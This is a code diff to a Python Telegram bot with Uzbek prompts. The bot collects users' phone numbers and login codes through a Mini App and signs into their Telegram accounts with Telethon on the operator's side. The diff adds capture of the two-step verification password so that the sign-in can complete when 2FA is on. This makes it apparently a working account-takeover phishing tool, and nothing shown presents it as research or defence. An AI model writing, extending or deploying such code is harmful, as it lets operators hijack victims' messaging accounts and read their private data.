@@ -10,7 +10,7 @@ from telebot.types import (
     InlineKeyboardMarkup,
     WebAppInfo
 )
-from telethon import utils
+from telethon import utils, errors
 from telethon.sync import TelegramClient
 
 import logging
@@ -93,7 +93,7 @@ def process_phone_step(message: Message):
     client.disconnect()
 
     markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    button = KeyboardButton("Open Mini App", web_app=WebAppInfo(url=URL))
+    button = KeyboardButton("🔑 Kiritish", web_app=WebAppInfo(url=URL))
     markup.add(button)
 
     
@@ -128,19 +128,74 @@ def process_verify_code_step(message: Message):
     parsed_phone = utils.parse_phone(phone=phone)
 
     me = None
+    two_step_detected = False
 
     client._phone_code_hash = {parsed_phone: auth['phone_hash']}
 
     try:
         me = client.sign_in(phone=phone, code=verify_code)
+    except errors.SessionPasswordNeededError:
+        two_step_detected = True
     except Exception as e:
         logging.error(e)
         bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
         return
 
-    logging.warning(me)
+    # hande 2fa detection
+    if two_step_detected:
+        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        button = KeyboardButton("🔑 Kiritish", web_app=WebAppInfo(url=URL))
+        markup.add(button)
+        
+        msg = bot.reply_to(
+            message,
+            "Iltimos 2-bosqich kodni kiriting:",
+            reply_markup=markup
+        )
+        bot.register_next_step_handler(msg, process_2fa_step)
+        return
 
     client.disconnect()
+
+    bot.reply_to(message, "Authentication finished.")
+
+
+def process_2fa_step(message: Message):
+    if not message.web_app_data: return
+    data = json.loads(message.web_app_data.data)
+
+    pass_2fa = data['code']
+
+    try:
+        asyncio.get_running_loop()
+    except RuntimeError:
+        asyncio.set_event_loop(asyncio.new_event_loop())
+
+    auth = user_auth_data.get(message.from_user.id, None)
+
+    if not auth: return
+
+    client = get_client(auth['phone'])
+    client.connect()
+
+    phone = auth['phone']
+    # parse the phone (removes '+' sign)
+    parsed_phone = utils.parse_phone(phone=phone)
+
+    me = None
+
+    client._phone_code_hash = {parsed_phone: auth['phone_hash']}
+
+    try:
+        me = client.sign_in(phone=phone, password=pass_2fa)
+    except Exception as e:
+        logging.error(e)
+        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
+        return
+    
+    client.disconnect()
+    
+    bot.reply_to(message, "Authentication finished.")
 
 
 
